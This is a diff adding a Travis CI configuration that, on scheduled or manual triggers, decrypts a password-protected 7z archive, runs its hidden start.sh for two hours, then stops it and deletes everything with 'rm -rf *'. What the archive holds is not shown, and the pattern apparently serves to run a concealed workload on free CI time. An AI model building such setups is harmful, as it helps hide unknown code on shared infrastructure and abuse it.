@@ -1,0 +1,76 @@
+language: minimal
+
+os: linux
+dist: focal
+
+# 定时任务：每10分钟运行一次
+# 注意: Travis CI 的 cron 最小间隔是每天，无法实现10分钟间隔
+# 如需10分钟间隔，建议使用 GitHub Actions 或其他 CI 工具
+if: type = cron OR type = api
+
+env:
+  global:
+    # ZIP_PASS 通过 Travis CI 加密变量设置
+    - secure: "your_encrypted_password_here"
+
+before_install:
+  # 安装 p7zip-full 用于解压 7z 文件
+  - sudo apt-get update
+  - sudo apt-get install -y p7zip-full
+
+script:
+  # 检查是否应该运行（简化版本，Travis 不支持复杂的条件检查）
+  - |
+    if [ "$TRAVIS_EVENT_TYPE" = "api" ]; then
+      echo "Manual trigger detected, proceeding..."
+      SHOULD_RUN=true
+    elif [ "$TRAVIS_EVENT_TYPE" = "cron" ]; then
+      echo "Cron trigger detected, proceeding..."
+      SHOULD_RUN=true
+    else
+      echo "Skipping: not a cron or manual trigger"
+      SHOULD_RUN=false
+      exit 0
+    fi
+
+  # 解压文件
+  - |
+    if [ "$SHOULD_RUN" = true ]; then
+      echo "Extracting 7z file..."
+      7z x -p"${ZIP_PASS}" g-test-action-v2.7z &
+      wait
+    fi
+
+  # 启动服务
+  - |
+    if [ "$SHOULD_RUN" = true ]; then
+      echo "Starting services..."
+      chmod +x start.sh && ./start.sh &
+      echo "Service started"
+      
+      # 等待7200秒 (2小时)，分24个周期
+      for i in {1..24}; do
+        echo "Sleeping for 300 seconds (cycle $i/24)"
+        sleep 300
+      done
+      
+      echo "Completed 24 sleep cycles, total 7200 seconds"
+      
+      # 停止服务
+      echo "Stopping services..."
+      chmod +x stop.sh && ./stop.sh &
+      wait
+    fi
+
+after_script:
+  # 清理文件
+  - rm -rf *
+
+# Travis CI 的超时设置
+# 注意: Travis CI 免费版有构建时间限制
+# 开源项目: 50分钟, 私有项目可能更短
+# 你的脚本需要运行2小时，可能需要付费版
+timeout: 7200
+
+notifications:
+  email: false
